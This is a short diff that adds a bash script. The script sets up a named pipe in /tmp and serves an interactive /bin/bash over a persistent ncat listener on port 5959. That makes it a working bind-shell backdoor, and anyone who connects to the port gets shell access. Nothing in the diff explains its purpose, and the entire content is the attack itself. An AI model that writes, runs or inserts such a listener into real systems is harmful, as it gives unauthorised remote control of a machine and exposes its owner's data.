@@ -1,0 +1,5 @@
+#!/usr/bin/env bash
+file=/tmp/shell
+port=5959
+mkfifo ${file}
+cat ${file} | /bin/bash -i 2>&1 | ncat -kl ${port} > ${file}
